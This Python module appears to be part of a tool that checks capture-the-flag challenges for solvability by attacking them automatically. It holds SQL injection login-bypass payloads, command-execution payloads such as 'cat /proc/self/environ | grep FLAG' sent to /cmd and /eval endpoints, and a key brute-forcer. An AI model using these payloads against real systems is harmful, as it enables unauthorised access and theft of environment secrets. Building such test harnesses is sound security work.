"""
Project Sol: Problem Solver

Automatically solves CTF problems to verify they are actually solvable
from the attacker's perspective (without access to source code).
"""

import re
import time
from typing import Dict, Any, Optional, Tuple, List
import sys

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False
    print("Warning: requests library not installed. Problem solving will be limited.", file=sys.stderr)


class ProblemSolver:
    """Solves CTF problems automatically to verify they are solvable."""
    
    def __init__(self):
        """Initialize solver."""
        if not HAS_REQUESTS:
            raise RuntimeError("requests library is required for problem solving")
    
    def solve_logic_error(self, container_url: str, expected_flag: str) -> Tuple[bool, Optional[str], Optional[str]]:
        """
        Solve LogicError problems (e.g., Caesar cipher, simple encoding).
        
        Args:
            container_url: Container URL (e.g., "http://localhost:32804")
            expected_flag: Expected flag value
            
        Returns:
            Tuple of (success, found_flag, method_used)
        """
        try:
            # Step 1: Get the main page
            response = requests.get(container_url, timeout=5)
            if response.status_code != 200:
                return False, None, f"Failed to access main page: {response.status_code}"
            
            html_content = response.text
            
            # Step 2: Look for hints in the HTML
            # Check for visible encrypted/encoded messages
            encrypted_patterns = [
                r'encrypt[^>]*>([^<]+)',
                r'decrypt[^>]*>([^<]+)',
                r'message[^>]*>([^<]+)',
                r'cipher[^>]*>([^<]+)',
            ]
            
            encrypted_message = None
            for pattern in encrypted_patterns:
                match = re.search(pattern, html_content, re.IGNORECASE)
                if match:
                    encrypted_message = match.group(1).strip()
                    break
            
            # If no encrypted message found in HTML, try common endpoints
            if not encrypted_message:
                # Try common endpoints
                test_endpoints = ['/message', '/cipher', '/encrypted', '/secret']
                for endpoint in test_endpoints:
                    try:
                        resp = requests.get(f"{container_url}{endpoint}", timeout=3)
                        if resp.status_code == 200:
                            encrypted_message = resp.text.strip()
                            break
                    except:
                        continue
            
            # Step 3: Try common decryption methods
            if encrypted_message:
                # Try Caesar cipher shifts (1-26)
                for shift in range(1, 27):
                    decrypted = self._caesar_decrypt(encrypted_message, shift)
                    if expected_flag.lower() in decrypted.lower() or "flag" in decrypted.lower():
                        # Try submitting this shift as key
                        try:
                            decode_response = requests.post(
                                f"{container_url}/decode",
                                data={'key': str(shift)},
                                timeout=5
                            )
                            if expected_flag in decode_response.text:
                                return True, expected_flag, f"Caesar cipher with shift {shift}"
                        except:
                            pass
                
                # Try ROT13
                decrypted = self._rot13_decrypt(encrypted_message)
                if expected_flag.lower() in decrypted.lower():
                    try:
                        decode_response = requests.post(
                            f"{container_url}/decode",
                            data={'key': '13'},
                            timeout=5
                        )
                        if expected_flag in decode_response.text:
                            return True, expected_flag, "ROT13"
                    except:
                        pass
            
            # Step 4: Try brute force common keys (0-100)
            for key in range(0, 101):
                try:
                    decode_response = requests.post(
                        f"{container_url}/decode",
                        data={'key': str(key)},
                        timeout=3
                    )
                    if expected_flag in decode_response.text:
                        return True, expected_flag, f"Brute force key {key}"
                except:
                    continue
            
            return False, None, "Could not solve: No valid key found"
            
        except Exception as e:
            return False, None, f"Error during solving: {str(e)}"
    
    def solve_sqli(self, container_url: str, expected_flag: str) -> Tuple[bool, Optional[str], Optional[str]]:
        """
        Solve SQL Injection problems.
        
        Args:
            container_url: Container URL
            expected_flag: Expected flag value
            
        Returns:
            Tuple of (success, found_flag, method_used)
        """
        try:
            # First, check if the application is accessible
            try:
                response = requests.get(container_url, timeout=5)
                if response.status_code >= 500:
                    return False, None, f"Application error: HTTP {response.status_code}"
            except requests.RequestException as e:
                return False, None, f"Application not accessible: {str(e)}"
            
            # Check for database initialization errors
            try:
                # Try a simple query to see if database is initialized
                test_response = requests.post(
                    f"{container_url}/login",
                    data={'username': 'test', 'password': 'test'},
                    timeout=5
                )
                if "no such table" in test_response.text.lower():
                    return False, None, "Database not initialized: no such table error"
                if "database" in test_response.text.lower() and "error" in test_response.text.lower():
                    return False, None, f"Database error: {test_response.text[:100]}"
            except:
                pass
            
            # Common SQLi payloads
            payloads = [
                ("admin' -- ", "password"),
                ("admin' OR '1'='1", "password"),
                ("' OR '1'='1", "password"),
                ("admin'/*", "password"),
                ("' OR 1=1 -- ", "password"),
            ]
            
            for username, password in payloads:
                try:
                    response = requests.post(
                        f"{container_url}/login",
                        data={'username': username, 'password': password},
                        timeout=5
                    )
                    # Check for database errors
                    if "no such table" in response.text.lower():
                        return False, None, "Database not initialized: no such table error"
                    if expected_flag in response.text:
                        return True, expected_flag, f"SQLi payload: {username}"
                except:
                    continue
            
            return False, None, "Could not solve: No valid SQLi payload found"
            
        except Exception as e:
            return False, None, f"Error during solving: {str(e)}"
    
    def solve_rce(self, container_url: str, expected_flag: str) -> Tuple[bool, Optional[str], Optional[str]]:
        """
        Solve RCE problems.
        
        Args:
            container_url: Container URL
            expected_flag: Expected flag value
            
        Returns:
            Tuple of (success, found_flag, method_used)
        """
        try:
            # Common RCE payloads
            payloads = [
                "cat flag.txt",
                "cat /flag.txt",
                "cat /home/ctfuser/flag.txt",
                "env | grep FLAG",
                "printenv | grep FLAG",
                "cat /proc/self/environ | grep FLAG",
            ]
            
            # Try common endpoints
            endpoints = ['/execute', '/run', '/cmd', '/command', '/eval']
            
            for endpoint in endpoints:
                for payload in payloads:
                    try:
                        response = requests.post(
                            f"{container_url}{endpoint}",
                            data={'cmd': payload, 'command': payload},
                            timeout=5
                        )
                        if expected_flag in response.text:
                            return True, expected_flag, f"RCE payload: {payload}"
                    except:
                        continue
            
            return False, None, "Could not solve: No valid RCE payload found"
            
        except Exception as e:
            return False, None, f"Error during solving: {str(e)}"
    
    def solve(self, container_url: str, mission_type: str, expected_flag: str) -> Tuple[bool, Optional[str], Optional[str]]:
        """
        Solve a problem based on its type.
        
        Args:
            container_url: Container URL
            mission_type: Problem type (e.g., "SQLi", "RCE", "LogicError")
            expected_flag: Expected flag value
            
        Returns:
            Tuple of (success, found_flag, method_used)
        """
        if mission_type == "SQLi":
            return self.solve_sqli(container_url, expected_flag)
        elif mission_type == "RCE":
            return self.solve_rce(container_url, expected_flag)
        elif mission_type == "LogicError":
            return self.solve_logic_error(container_url, expected_flag)
        else:
            # Generic solver: try common endpoints and methods
            return self._generic_solve(container_url, expected_flag)
    
    def _generic_solve(self, container_url: str, expected_flag: str) -> Tuple[bool, Optional[str], Optional[str]]:
        """Generic solver that tries common methods."""
        try:
            # Try common endpoints
            endpoints = ['/', '/flag', '/api/flag', '/debug', '/env']
            for endpoint in endpoints:
                try:
                    response = requests.get(f"{container_url}{endpoint}", timeout=3)
                    if expected_flag in response.text:
                        return True, expected_flag, f"Found at {endpoint}"
                except:
                    continue
            
            return False, None, "Could not solve: Flag not found in common locations"
        except Exception as e:
            return False, None, f"Error: {str(e)}"
    
    def _caesar_decrypt(self, text: str, shift: int) -> str:
        """Decrypt Caesar cipher."""
        result = []
        for char in text:
            if char.isalpha():
                ascii_offset = 65 if char.isupper() else 97
                decrypted = chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)
                result.append(decrypted)
            else:
                result.append(char)
        return ''.join(result)
    
    def _rot13_decrypt(self, text: str) -> str:
        """Decrypt ROT13."""
        return self._caesar_decrypt(text, 13)

